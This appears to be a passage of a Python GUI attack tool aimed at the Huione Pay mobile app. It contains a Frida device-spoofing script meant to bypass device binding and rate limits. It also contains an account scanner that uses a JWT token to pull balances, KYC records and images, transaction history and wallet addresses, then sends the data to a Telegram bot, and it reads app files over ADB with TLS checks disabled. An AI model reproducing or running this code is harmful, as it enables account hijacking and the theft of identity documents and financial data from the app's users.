        self.results = []

    def scan_all(self):
        def _scan():
            import urllib.request
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            targets = [
                ("S3 IP Config", "GET", "https://datadogips.s3.ap-southeast-1.amazonaws.com/ip.json", None),
                ("Primary API", "POST", "https://app.hh3721.com/app/foundation-server/foundation/common/nations", "{}"),
                ("Customer Service", "POST", "https://app.hh3721.com/app/foundation-server/foundation/common/customerServices", "{}"),
                ("CAPTCHA (should be 404)", "POST", "https://app.hh3721.com/app/foundation-server/foundation/user/checkManMachine", '{"type":"login"}'),
                ("Huione RPC", "POST", "https://rpc.huione.org", '{"jsonrpc":"2.0","id":1,"method":"getVersion","params":[]}'),
                ("BSC C2 Contract", "POST", "https://bsc-dataseed.binance.org", '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":"0xe9d5f645f79fa60fca82b4e1d35832e43370feb0","data":"0x20965255"},"latest"]}'),
                ("Direct IP 8.217.236.122", "POST", "https://8.217.236.122:19003/app/foundation-server/foundation/common/nations", "{}"),
                ("ipwho.is", "GET", "https://ipwho.is/", None),
                ("Cancel Account", "GET", "https://cancelaccount-h5.oykqk.com", None),
            ]

            self.log.clear()
            self.log.log_color("=== BAT DAU SCAN ===", PURPLE)
            self.results = []
            ok = 0

            for name, method, url, body in targets:
                try:
                    start = time.time()
                    if method == "GET":
                        req = urllib.request.Request(url)
                    else:
                        req = urllib.request.Request(
                            url, data=body.encode() if body else None,
                            headers={"Content-Type": "application/json"},
                            method="POST"
                        )
                    with urllib.request.urlopen(req, context=ctx, timeout=20) as resp:
                        status = resp.status
                        elapsed = (time.time() - start) * 1000
                        body_resp = resp.read(2000).decode("utf-8", errors="replace")
                except urllib.error.HTTPError as e:
                    status = e.code
                    elapsed = (time.time() - start) * 1000
                    body_resp = ""
                except Exception as e:
                    status = 0
                    elapsed = 0
                    body_resp = str(e)

                color = GREEN if 200 <= status < 400 else (YELLOW if 400 <= status < 500 else RED)
                self.log.log_color(f"  [{status}] {name} ({elapsed:.0f}ms)", color)
                if body_resp and len(body_resp) < 200:
                    self.log.log(f"       {body_resp[:200]}")

                self.results.append({
                    "name": name, "url": url, "status": status,
                    "time_ms": round(elapsed), "timestamp": datetime.utcnow().isoformat() + "Z",
                    "response": body_resp[:500]
                })
                if 200 <= status < 500:
                    ok += 1

            self.log.log("")
            self.log.log_color(f"=== KET QUA: {ok}/{len(targets)} server phan hoi ===", PURPLE)

        threading.Thread(target=_scan, daemon=True).start()

    def save_results(self):
        if not self.results:
            messagebox.showwarning("", "Chua scan! Bam 'SCAN TAT CA SERVER' truoc.")
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(SCRIPT_DIR, f"infra_scan_{ts}.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        self.log.log_color(f"Da luu: {path}", GREEN)
        messagebox.showinfo("OK", f"Da luu ket qua:\n{path}")


# ============================================================
# TAB 7: DEVICE SPOOF
# ============================================================
class DeviceSpoofTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="DEVICE ID SPOOF",
                 font=FONT_BIG, bg=BG2, fg=YELLOW).pack(pady=(15, 5))
        tk.Label(self, text="Thay doi device ID, brand, model — bypass device binding va rate limit",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        cf = tk.LabelFrame(self, text="Cau hinh Device gia", bg=BG2, fg=ACCENT, font=FONT_BOLD)
        cf.pack(fill="x", padx=20, pady=5)

        fields = [
            ("UUID:", "uuid_var", "a1b2c3d4-e5f6-7890-abcd-ef1234567890"),
            ("Brand:", "brand_var", "google"),
            ("Model:", "model_var", "Pixel 6"),
            ("Android Version:", "android_var", "14"),
        ]
        for label, var_name, default in fields:
            row = tk.Frame(cf, bg=BG2)
            row.pack(fill="x", padx=10, pady=2)
            tk.Label(row, text=label, bg=BG2, fg=FG, font=FONT, width=20, anchor="w").pack(side="left")
            var = tk.StringVar(value=default)
            setattr(self, var_name, var)
            ThemedEntry(row, textvariable=var, width=50).pack(side="left", padx=5)

        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=10)
        ThemedButton(bf, text="Random Device",
                     command=self.random_device, color=ACCENT).pack(side="left", padx=5)
        ThemedButton(bf, text="APPLY SPOOF (Frida)",
                     command=self.apply_spoof, color=YELLOW).pack(side="left", padx=5)
        ThemedButton(bf, text="Tao 10 Device",
                     command=self.gen_10, color=PURPLE).pack(side="left", padx=5)

        self.log = LogBox(self, height=18)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)

    def random_device(self):
        import uuid as uuid_mod
        import random
        brands = [("google", "Pixel 6"), ("samsung", "Galaxy S23"), ("xiaomi", "Redmi Note 12"),
                  ("oppo", "Find X6"), ("oneplus", "11R"), ("vivo", "V29")]
        b, m = random.choice(brands)
        self.uuid_var.set(str(uuid_mod.uuid4()))
        self.brand_var.set(b)
        self.model_var.set(m)
        self.android_var.set(random.choice(["12", "13", "14"]))
        self.log.log(f"Random device: {b} {m}, UUID={self.uuid_var.get()[:8]}...")

    def apply_spoof(self):
        self.log.log_color("Tao Frida script spoof device...", YELLOW)
        script = f'''// Device Spoof Script
'use strict';
var UUID = "{self.uuid_var.get()}";
var PROPS = {{
    "ro.product.brand": "{self.brand_var.get()}",
    "ro.product.model": "{self.model_var.get()}",
    "ro.build.version.release": "{self.android_var.get()}",
    "ro.product.manufacturer": "{self.brand_var.get().title()}"
}};
var libc = Process.findModuleByName("libc.so");
var prop_get = libc.findExportByName("__system_property_get");
Interceptor.attach(prop_get, {{
    onEnter: function(a) {{ this.name = a[0].readUtf8String(); this.val = a[1]; }},
    onLeave: function(r) {{
        if (this.name && PROPS[this.name]) {{
            this.val.writeUtf8String(PROPS[this.name]);
            send("PROP_SPOOF: " + this.name + " -> " + PROPS[this.name]);
        }}
    }}
}});
var c_read = libc.findExportByName("read");
Interceptor.attach(c_read, {{
    onEnter: function(a) {{ this.fd = a[0].toInt32(); this.buf = a[1]; }},
    onLeave: function(r) {{
        var n = r.toInt32();
        if (n > 10 && n < 1000) {{
            try {{
                var data = this.buf.readUtf8String(n);
                var m = data.match(/[0-9a-f]{{8}}-[0-9a-f]{{4}}-[0-9a-f]{{4}}-[0-9a-f]{{4}}-[0-9a-f]{{12}}/i);
                if (m && m[0] !== UUID) {{
                    this.buf.writeUtf8String(data.replace(m[0], UUID));
                    send("UUID_SPOOF: " + m[0] + " -> " + UUID);
                }}
            }} catch(e) {{}}
        }}
    }}
}});
send("Device Spoof active: " + PROPS["ro.product.brand"] + " " + PROPS["ro.product.model"]);
'''
        path = os.path.join(SCRIPT_DIR, "_tmp_device_spoof.js")
        with open(path, "w") as f:
            f.write(script)
        self.log.log(f"Script luu tai: {path}")
        self.log.log("Chay: frida -H 127.0.0.1:27042 -n Gadget -l " + path)
        self.log.log("Hoac: frida -U -f com.huione.pay -l " + path)

    def gen_10(self):
        import uuid as uuid_mod
        import random
        self.log.clear()
        self.log.log_color("=== 10 DEVICE GIA ===", YELLOW)
        brands = [("google", "Pixel 6"), ("samsung", "Galaxy S23"), ("xiaomi", "Redmi Note 12"),
                  ("oppo", "Find X6"), ("oneplus", "11R"), ("vivo", "V29"),
                  ("samsung", "Galaxy A54"), ("xiaomi", "POCO X5"),
                  ("huawei", "Nova 11"), ("realme", "GT Neo 5")]
        for i, (b, m) in enumerate(brands):
            uid = str(uuid_mod.uuid4())
            self.log.log(f"  {i+1}. {b:10s} {m:20s} UUID={uid}")


# ============================================================
# TAB 8: ACCOUNT SCANNER (API Data Extraction)
# ============================================================
class AccountScanTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="ACCOUNT & DATA SCANNER",
                 font=FONT_BIG, bg=BG2, fg=GREEN).pack(pady=(15, 5))
        tk.Label(self, text="Scan toan bo du lieu tai khoan: so du, KYC, hinh anh, lich su giao dich, thiet bi",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        # Auth config
        cf = tk.LabelFrame(self, text="Xac thuc", bg=BG2, fg=ACCENT, font=FONT_BOLD)
        cf.pack(fill="x", padx=20, pady=5)

        row1 = tk.Frame(cf, bg=BG2)
        row1.pack(fill="x", padx=10, pady=3)
        tk.Label(row1, text="JWT Token:", bg=BG2, fg=FG, font=FONT, width=15, anchor="w").pack(side="left")
        self.token_var = tk.StringVar()
        ThemedEntry(row1, textvariable=self.token_var, width=80).pack(side="left", padx=5, fill="x", expand=True)

        row2 = tk.Frame(cf, bg=BG2)
        row2.pack(fill="x", padx=10, pady=3)
        tk.Label(row2, text="Server:", bg=BG2, fg=FG, font=FONT, width=15, anchor="w").pack(side="left")
        self.server_var = tk.StringVar(value="https://app.hh3721.com/app/foundation-server")
        ThemedEntry(row2, textvariable=self.server_var, width=60).pack(side="left", padx=5)

        # Scan buttons - 2 rows
        bf1 = tk.Frame(self, bg=BG2)
        bf1.pack(fill="x", padx=20, pady=(10, 3))
        ThemedButton(bf1, text="SCAN & GUI TELEGRAM",
                     command=self.scan_and_send_tg, color=RED).pack(side="left", padx=3)
        ThemedButton(bf1, text="SCAN TAT CA",
                     command=self.scan_all, color=GREEN).pack(side="left", padx=3)
        ThemedButton(bf1, text="Thong tin User",
                     command=self.scan_userinfo, color=ACCENT).pack(side="left", padx=3)
        ThemedButton(bf1, text="So du / Tai san",
                     command=self.scan_wealth, color=ORANGE).pack(side="left", padx=3)
        ThemedButton(bf1, text="KYC + Hinh anh",
                     command=self.scan_kyc, color=PURPLE).pack(side="left", padx=3)

        bf2 = tk.Frame(self, bg=BG2)
        bf2.pack(fill="x", padx=20, pady=(3, 5))
        ThemedButton(bf2, text="Lich su giao dich",
                     command=self.scan_bills, color=YELLOW).pack(side="left", padx=3)
        ThemedButton(bf2, text="Danh sach thiet bi",
                     command=self.scan_devices, color=ACCENT).pack(side="left", padx=3)
        ThemedButton(bf2, text="Dia chi vi",
                     command=self.scan_addresses, color=GREEN).pack(side="left", padx=3)
        ThemedButton(bf2, text="Token & Thiet bi",
                     command=self.scan_tokens_devices, color=YELLOW).pack(side="left", padx=3)
        ThemedButton(bf2, text="Vi tri IP",
                     command=self.scan_location, color=RED).pack(side="left", padx=3)
        ThemedButton(bf2, text="Cau hinh giao dich",
                     command=self.scan_trade_config, color=BG3).pack(side="left", padx=3)
        ThemedButton(bf2, text="Luu ket qua JSON",
                     command=self.save_results, color=BG3).pack(side="left", padx=3)

        # Results
        self.log = LogBox(self, height=20)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)
        self.all_results = {}

    def _shell(self, cmd):
        """Run ADB shell command."""
        code, out, err = adb_cmd(f'shell {cmd}', timeout=15)
        return out

    def _api(self, endpoint, data=None):
        """Call Huione API."""
        import urllib.request, ssl
        token = self.token_var.get().strip()
        server = self.server_var.get().strip().rstrip("/")
        if not token:
            self.log.log_color("Nhap JWT Token truoc!", RED)
            return None
        url = f"{server}{endpoint}"
        body = json.dumps(data or {}).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
            "Accept-Language": "vi",
            "User-Agent": "okhttp/4.9.3",
        }
        try:
            req = urllib.request.Request(url, data=body, headers=headers, method="POST")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
                return json.loads(resp.read().decode())
        except Exception as e:
            return {"error": str(e)}

    def _display(self, title, data):
        """Display data in log."""
        self.log.log_color(f"\n{'='*50}", ACCENT)
        self.log.log_color(f"  {title}", ACCENT)
        self.log.log_color(f"{'='*50}", ACCENT)
        if data:
            txt = json.dumps(data, indent=2, ensure_ascii=False)
            for line in txt.split("\n"):
                if '"error"' in line or '"msg"' in line:
                    self.log.log_color(line, YELLOW)
                elif '"balance"' in line or '"amount"' in line or '"wealth"' in line:
                    self.log.log_color(line, GREEN)
                elif '"phone"' in line or '"name"' in line or '"userId"' in line:
                    self.log.log_color(line, ORANGE)
                elif '"url"' in line or '"image"' in line or '"photo"' in line:
                    self.log.log_color(line, PURPLE)
                else:
                    self.log.log(line)

    def scan_userinfo(self):
        def _run():
            self.log.log("Dang lay thong tin user...")
            r = self._api("/foundation/user/userInfo")
            self.all_results["userInfo"] = r
            self._display("THONG TIN USER", r)

            # Also get heartbeat (shows login status)
            r2 = self._api("/foundation/user/heartbeat")
            self.all_results["heartbeat"] = r2
            self._display("HEARTBEAT / TRANG THAI DANG NHAP", r2)

            # Query todos
            r3 = self._api("/foundation/user/queryToDo")
            self.all_results["todos"] = r3
            self._display("CONG VIEC CHO XU LY", r3)
        threading.Thread(target=_run, daemon=True).start()

    def scan_wealth(self):
        def _run():
            self.log.log("Dang lay so du tai khoan...")

            # Total wealth
            r = self._api("/foundation/account/wealth")
            self.all_results["wealth"] = r
            self._display("TONG TAI SAN", r)

            # Account get
            r2 = self._api("/foundation/account/get")
            self.all_results["account"] = r2
            self._display("CHI TIET TAI KHOAN", r2)

            # Asset distribution
            r3 = self._api("/foundation/account/distribution")
            self.all_results["distribution"] = r3
            self._display("PHAN BO TAI SAN", r3)

            # Deposit currencies
            r4 = self._api("/foundation/account/v3/depositCurrency")
            self.all_results["deposit_currencies"] = r4
            self._display("LOAI TIEN NAP", r4)

            # Withdraw currencies
            r5 = self._api("/foundation/account/withdrawCurrency")
            self.all_results["withdraw_currencies"] = r5
            self._display("LOAI TIEN RUT", r5)
        threading.Thread(target=_run, daemon=True).start()

    def scan_kyc(self):
        def _run():
            self.log.log("Dang lay thong tin KYC...")

            # KYC v1
            r = self._api("/foundation/kyc/get")
            self.all_results["kyc"] = r
            self._display("KYC V1", r)

            # KYC v2
            r2 = self._api("/foundation/kyc/v2/get")
            self.all_results["kyc_v2"] = r2
            self._display("KYC V2 (CHI TIET)", r2)

            # Extract image URLs if present
            self.log.log_color("\n--- HINH ANH KYC ---", PURPLE)
            img_count = 0
            for key, val in [("kyc", r), ("kyc_v2", r2)]:
                if not val or "data" not in val:
                    continue
                data = val.get("data", {})
                if isinstance(data, str):
                    try:
                        data = json.loads(data)
                    except:
                        continue
                if isinstance(data, dict):
                    for k, v in data.items():
                        if isinstance(v, str) and ("http" in v or "image" in k.lower() or
                                "photo" in k.lower() or "url" in k.lower() or "front" in k.lower() or
                                "back" in k.lower() or "face" in k.lower() or "selfie" in k.lower()):
                            img_count += 1
                            self.log.log_color(f"  [{key}] {k}: {v}", PURPLE)
                            self.all_results[f"kyc_image_{img_count}"] = {"field": k, "url": v, "source": key}

            if img_count == 0:
                self.log.log("  Khong tim thay hinh anh KYC trong response")
                self.log.log("  (Co the can giai ma AES truoc hoac KYC chua xac minh)")

            # Try to download KYC images
            if img_count > 0:
                self.log.log_color(f"\nTim thay {img_count} hinh anh KYC!", GREEN)
                self._download_kyc_images()
        threading.Thread(target=_run, daemon=True).start()

    def _download_kyc_images(self):
        """Download KYC images to local folder."""
        import urllib.request, ssl
        save_dir = os.path.join(SCRIPT_DIR, "kyc_images")
        os.makedirs(save_dir, exist_ok=True)

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        for key, val in self.all_results.items():
            if not key.startswith("kyc_image_"):
                continue
            url = val.get("url", "")
            field = val.get("field", "unknown")
            if not url.startswith("http"):
                continue
            try:
                req = urllib.request.Request(url)
                with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
                    data = resp.read()
                    ext = "jpg"
                    ct = resp.headers.get("content-type", "")
                    if "png" in ct:
                        ext = "png"
                    elif "pdf" in ct:
                        ext = "pdf"
                    fname = f"{field}.{ext}"
                    fpath = os.path.join(save_dir, fname)
                    with open(fpath, "wb") as f:
                        f.write(data)
                    self.log.log_color(f"  Downloaded: {fname} ({len(data)//1024}KB)", GREEN)
            except Exception as e:
                self.log.log_color(f"  Download failed [{field}]: {e}", RED)

    def scan_bills(self):
        def _run():
            self.log.log("Dang lay lich su giao dich...")

            # Bill query
            r = self._api("/foundation/bill/query", {"pageNo": 1, "pageSize": 50})
            self.all_results["bills"] = r
            self._display("LICH SU GIAO DICH (50 gan nhat)", r)

            # DC bill
            r2 = self._api("/foundation/dc-bill/app/pageBillListData", {"pageNo": 1, "pageSize": 50})
            self.all_results["dc_bills"] = r2
            self._display("LICH SU GIAO DICH DC", r2)

            # Recent transfer users
            r3 = self._api("/foundation/recent/transfer/users")
            self.all_results["recent_users"] = r3
            self._display("NGUOI NHAN GAN DAY", r3)

            # Order records
            r4 = self._api("/foundation/dc-bill/order/record", {"pageNo": 1, "pageSize": 50})
            self.all_results["order_records"] = r4
            self._display("LENH GIAO DICH", r4)
        threading.Thread(target=_run, daemon=True).start()

    def scan_devices(self):
        def _run():
            self.log.log("Dang lay danh sach thiet bi...")
            r = self._api("/foundation/user/devices")
            self.all_results["devices"] = r
            self._display("DANH SACH THIET BI DA DANG NHAP", r)
        threading.Thread(target=_run, daemon=True).start()

    def scan_addresses(self):
        def _run():
            self.log.log("Dang lay dia chi vi...")

            # Inner address
            r = self._api("/foundation/account/address/inner")
            self.all_results["address_inner"] = r
            self._display("DIA CHI VI NOI BO", r)

            # Chain registration
            r2 = self._api("/foundation/account/chainReg")
            self.all_results["chain_reg"] = r2
            self._display("DANG KY CHAIN", r2)

            # Customer services
            r3 = self._api("/foundation/common/customerServices")
            self.all_results["customer_services"] = r3
            self._display("DICH VU KHACH HANG", r3)

            # Nations
            r4 = self._api("/foundation/common/nations")
            self.all_results["nations"] = r4
            self._display("DANH SACH QUOC GIA", r4)

            # Skip links
            r5 = self._api("/foundation/common/skipLink")
            self.all_results["skip_links"] = r5
            self._display("LIEN KET NGOAI", r5)
        threading.Thread(target=_run, daemon=True).start()

    def scan_tokens_devices(self):
        """Scan JWT token details + all devices."""
        def _run():
            self.log.log_color("=== TOKEN & THIET BI ===", YELLOW)

            # Decode JWT token
            token = self.token_var.get().strip()
            if token:
                parts = token.split(".")
                if len(parts) == 3:
                    # Decode header
                    try:
                        hdr = parts[0] + "=" * (4 - len(parts[0]) % 4)
                        header = json.loads(base64.b64decode(hdr))
                        self.log.log_color("JWT Header:", ACCENT)
                        self.log.log(json.dumps(header, indent=2))
                    except:
                        pass

                    # Decode payload
                    try:
                        pay = parts[1] + "=" * (4 - len(parts[1]) % 4)
                        payload = json.loads(base64.b64decode(pay))
                        self.log.log_color("\nJWT Payload (THONG TIN TRONG TOKEN):", GREEN)
                        self.log.log(json.dumps(payload, indent=2, ensure_ascii=False))
                        self.all_results["jwt_payload"] = payload

                        # Extract key info
                        for k in ["userId", "phone", "exp", "iat", "sub", "deviceId", "role"]:
                            if k in payload:
                                val = payload[k]
                                if k in ("exp", "iat") and isinstance(val, (int, float)):
                                    from datetime import datetime as dt
                                    val = f"{val} ({dt.fromtimestamp(val).isoformat()})"
                                self.log.log_color(f"  {k}: {val}", ORANGE)
                    except:
                        self.log.log_color("Khong decode duoc JWT payload", RED)

            # Get all devices
            r = self._api("/foundation/user/devices")
            self.all_results["devices"] = r
            self._display("TAT CA THIET BI DA DANG NHAP", r)

            # Device tokens/sessions
            r2 = self._api("/foundation/user/userInfo")
            self.all_results["userInfo_token"] = r2
            if r2 and "data" in r2:
                data = r2.get("data", {})
                if isinstance(data, dict):
                    for k in ["phone", "userId", "nickName", "avatar", "inviteCode",
                              "email", "status", "createTime", "lastLoginTime",
                              "lastLoginDevice", "lastLoginIp"]:
                        if k in data:
                            self.log.log_color(f"  {k}: {data[k]}", GREEN)

            # ECDH public key status
            r3 = self._api("/foundation/risk/verifyPubKey")
            self.all_results["pubkey_status"] = r3
            self._display("TRANG THAI ECDH PUBLIC KEY", r3)
        threading.Thread(target=_run, daemon=True).start()

    def scan_location(self):
        """Scan IP location using same services Huione app uses."""
        def _run():
            import urllib.request, ssl
            self.log.log_color("=== VI TRI IP (Services giong app Huione dung) ===", RED)

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            # Same geolocation services hardcoded in Huione app
            services = [
                ("ipwho.is", "https://ipwho.is/"),
                ("ipapi.co", "https://ipapi.co/json/"),
                ("api.ip.sb", "https://api.ip.sb/geoip/"),
            ]

            for name, url in services:
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "okhttp/4.9.3"})
                    with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
                        data = json.loads(resp.read().decode())
                        self.all_results[f"geo_{name}"] = data
                        self.log.log_color(f"\n--- {name} ---", ACCENT)

                        # Display key fields
                        for k in ["ip", "country", "country_code", "region", "city",
                                  "latitude", "longitude", "timezone", "isp", "org",
                                  "asn", "as", "connection"]:
                            if k in data:
                                val = data[k]
                                if isinstance(val, dict):
                                    val = json.dumps(val)
                                self.log.log_color(f"  {k}: {val}", GREEN)
                except Exception as e:
                    self.log.log_color(f"  {name}: {e}", YELLOW)

            # Also get IP from Huione's S3 config (shows server IPs)
            try:
                req = urllib.request.Request("https://datadogips.s3.ap-southeast-1.amazonaws.com/ip.json")
                with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
                    data = json.loads(resp.read().decode())
                    self.all_results["huione_server_ips"] = data
                    self.log.log_color("\n--- Huione Server IPs (S3 config) ---", ORANGE)
                    self.log.log(json.dumps(data, indent=2))
            except Exception as e:
                self.log.log_color(f"  S3: {e}", YELLOW)

            # Get location from phone if connected
            self.log.log_color("\n--- Dien thoai ---", ACCENT)
            ip_info = self._shell("cat /data/data/com.huione.pay/shared_prefs/FlutterSharedPreferences.xml 2>/dev/null | grep -i ip")
            if ip_info:
                self.log.log(f"  SharedPrefs IP: {ip_info[:300]}")
            loc = self._shell("dumpsys location 2>/dev/null | head -20")
            if loc:
                self.log.log(f"  Location service: {loc[:300]}")

        threading.Thread(target=_run, daemon=True).start()

    def scan_trade_config(self):
        def _run():
            self.log.log("Dang lay cau hinh giao dich...")

            r = self._api("/foundation/trade/pay/config")
            self.all_results["pay_config"] = r
            self._display("CAU HINH THANH TOAN", r)

            r2 = self._api("/foundation/trade/config/get")
            self.all_results["trade_config"] = r2
            self._display("CAU HINH GIAO DICH", r2)

            # Auth app info
            r3 = self._api("/foundation/auth/login/getAppInfo")
            self.all_results["app_info"] = r3
            self._display("THONG TIN APP", r3)
        threading.Thread(target=_run, daemon=True).start()

    def scan_all(self):
        def _run():
            self.log.clear()
            self.all_results = {}
            self.log.log_color("=== BAT DAU SCAN TOAN BO ===", GREEN)
            self.log.log("Se scan: UserInfo, Wealth, KYC, Bills, Devices, Addresses, Config")
            self.log.log("")

            # Run all scans sequentially
            for name, func in [
                ("User Info", self._scan_userinfo_sync),
                ("So du / Tai san", self._scan_wealth_sync),
                ("KYC", self._scan_kyc_sync),
                ("Lich su giao dich", self._scan_bills_sync),
                ("Thiet bi", self._scan_devices_sync),
                ("Dia chi vi", self._scan_addresses_sync),
                ("Cau hinh", self._scan_config_sync),
            ]:
                self.log.log_color(f"\n>>> Dang scan: {name}...", ACCENT)
                try:
                    func()
                except Exception as e:
                    self.log.log_color(f"  Loi: {e}", RED)
                time.sleep(0.3)

            self.log.log_color(f"\n{'='*50}", GREEN)
            self.log.log_color(f"  SCAN HOAN TAT — {len(self.all_results)} muc du lieu", GREEN)
            self.log.log_color(f"{'='*50}", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    # Sync versions for scan_all
    def _scan_userinfo_sync(self):
        for ep, key, title in [
            ("/foundation/user/userInfo", "userInfo", "THONG TIN USER"),
            ("/foundation/user/heartbeat", "heartbeat", "HEARTBEAT"),
            ("/foundation/user/queryToDo", "todos", "CONG VIEC"),
        ]:
            r = self._api(ep)
            self.all_results[key] = r
            self._display(title, r)

    def _scan_wealth_sync(self):
        for ep, key, title in [
            ("/foundation/account/wealth", "wealth", "TONG TAI SAN"),
            ("/foundation/account/get", "account", "TAI KHOAN"),
            ("/foundation/account/distribution", "distribution", "PHAN BO"),
            ("/foundation/account/v3/depositCurrency", "deposit_cur", "TIEN NAP"),
            ("/foundation/account/withdrawCurrency", "withdraw_cur", "TIEN RUT"),
        ]:
            r = self._api(ep)
            self.all_results[key] = r
            self._display(title, r)

    def _scan_kyc_sync(self):
        for ep, key, title in [
            ("/foundation/kyc/get", "kyc", "KYC V1"),
            ("/foundation/kyc/v2/get", "kyc_v2", "KYC V2"),
        ]:
            r = self._api(ep)
            self.all_results[key] = r
            self._display(title, r)

    def _scan_bills_sync(self):
        r = self._api("/foundation/bill/query", {"pageNo": 1, "pageSize": 50})
        self.all_results["bills"] = r
        self._display("GIAO DICH", r)
        r2 = self._api("/foundation/recent/transfer/users")
        self.all_results["recent_users"] = r2
        self._display("NGUOI NHAN GAN DAY", r2)

    def _scan_devices_sync(self):
        r = self._api("/foundation/user/devices")
        self.all_results["devices"] = r
        self._display("THIET BI", r)

    def _scan_addresses_sync(self):
        for ep, key, title in [
            ("/foundation/account/address/inner", "address", "DIA CHI VI"),
            ("/foundation/account/chainReg", "chain_reg", "CHAIN REG"),
        ]:
            r = self._api(ep)
            self.all_results[key] = r
            self._display(title, r)

    def _scan_config_sync(self):
        for ep, key, title in [
            ("/foundation/trade/pay/config", "pay_config", "CAU HINH THANH TOAN"),
            ("/foundation/common/customerServices", "customer_svc", "DICH VU KH"),
            ("/foundation/common/skipLink", "skip_links", "LIEN KET"),
        ]:
            r = self._api(ep)
            self.all_results[key] = r
            self._display(title, r)

    def scan_and_send_tg(self):
        """Scan ALL data then auto-send to Telegram bot."""
        def _run():
            self.log.clear()
            self.all_results = {}
            self.log.log_color("=== SCAN & GUI QUA TELEGRAM ===", RED)
            self.log.log("Scan tat ca du lieu roi tu dong gui qua Telegram bot...")
            self.log.log("")

            # 1. Run all scans
            for name, func in [
                ("User Info", self._scan_userinfo_sync),
                ("So du / Tai san", self._scan_wealth_sync),
                ("KYC", self._scan_kyc_sync),
                ("Lich su giao dich", self._scan_bills_sync),
                ("Thiet bi", self._scan_devices_sync),
                ("Dia chi vi", self._scan_addresses_sync),
                ("Cau hinh", self._scan_config_sync),
            ]:
                self.log.log_color(f"\n>>> Dang scan: {name}...", ACCENT)
                try:
                    func()
                except Exception as e:
                    self.log.log_color(f"  Loi: {e}", RED)
                time.sleep(0.3)

            # 2. Decode JWT token
            token = self.token_var.get().strip()
            jwt_info = ""
            if token:
                parts = token.split(".")
                if len(parts) == 3:
                    try:
                        pay = parts[1] + "=" * (4 - len(parts[1]) % 4)
                        payload = json.loads(base64.b64decode(pay))
                        self.all_results["jwt_payload"] = payload
                        jwt_info = json.dumps(payload, indent=2, ensure_ascii=False)
                    except:
                        pass

            # 3. Get geolocation
            self.log.log_color("\n>>> Scan vi tri IP...", ACCENT)
            import urllib.request, ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            geo_info = ""
            try:
                req = urllib.request.Request("https://ipwho.is/", headers={"User-Agent": "okhttp/4.9.3"})
                with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
                    geo = json.loads(resp.read().decode())
                    self.all_results["geolocation"] = geo
                    geo_info = f"IP: {geo.get('ip')}\nCountry: {geo.get('country')}\nCity: {geo.get('city')}\nISP: {geo.get('connection', {}).get('isp', 'N/A')}"
            except:
                geo_info = "N/A"

            # 4. Save full results to JSON
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            json_path = os.path.join(SCRIPT_DIR, f"full_scan_{ts}.json")
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(self.all_results, f, indent=2, ensure_ascii=False, default=str)

            # =====================================================
            # 5. SEND TO TELEGRAM
            # =====================================================
            self.log.log_color("\n=== GUI QUA TELEGRAM ===", RED)

            # Message 1: Summary
            user_data = self.all_results.get("userInfo", {}).get("data", {})
            if isinstance(user_data, str):
                try:
                    user_data = json.loads(user_data)
                except:
                    user_data = {}
            wealth_data = self.all_results.get("wealth", {}).get("data", {})
            if isinstance(wealth_data, str):
                try:
                    wealth_data = json.loads(wealth_data)
                except:
                    wealth_data = {}

            summary = f"""HUIONE PAY SCAN - {ts}

USER INFO:
  Phone: {user_data.get('phone', 'N/A')}
  UserId: {user_data.get('userId', 'N/A')}
  Name: {user_data.get('nickName', 'N/A')}
  Status: {user_data.get('status', 'N/A')}
  Created: {user_data.get('createTime', 'N/A')}
  Last Login: {user_data.get('lastLoginTime', 'N/A')}
  Last Device: {user_data.get('lastLoginDevice', 'N/A')}
  Last IP: {user_data.get('lastLoginIp', 'N/A')}
  InviteCode: {user_data.get('inviteCode', 'N/A')}
  Email: {user_data.get('email', 'N/A')}
  Avatar: {user_data.get('avatar', 'N/A')}

WEALTH:
{json.dumps(wealth_data, indent=2, ensure_ascii=False)[:1000] if wealth_data else 'N/A'}

GEOLOCATION:
{geo_info}

JWT TOKEN:
{jwt_info[:800] if jwt_info else 'N/A'}
"""
            self.log.log("Gui summary...")
            r = tg_send_message(summary, parse_mode="")
            if r.get("ok"):
                self.log.log_color("  Summary: OK", GREEN)
            else:
                self.log.log_color(f"  Summary: FAIL - {r.get('error', r.get('description', ''))}", RED)

            # Message 2: KYC data
            kyc_data = self.all_results.get("kyc", {})
            kyc_v2 = self.all_results.get("kyc_v2", {})
            kyc_text = f"KYC V1:\n{json.dumps(kyc_data, indent=2, ensure_ascii=False)[:1500]}\n\nKYC V2:\n{json.dumps(kyc_v2, indent=2, ensure_ascii=False)[:1500]}"
            self.log.log("Gui KYC data...")
            r = tg_send_message(f"KYC DATA:\n{kyc_text}", parse_mode="")
            if r.get("ok"):
                self.log.log_color("  KYC data: OK", GREEN)

